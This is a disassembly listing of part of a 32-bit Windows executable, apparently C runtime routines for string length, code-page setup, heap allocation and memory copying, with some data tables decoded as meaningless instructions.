  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
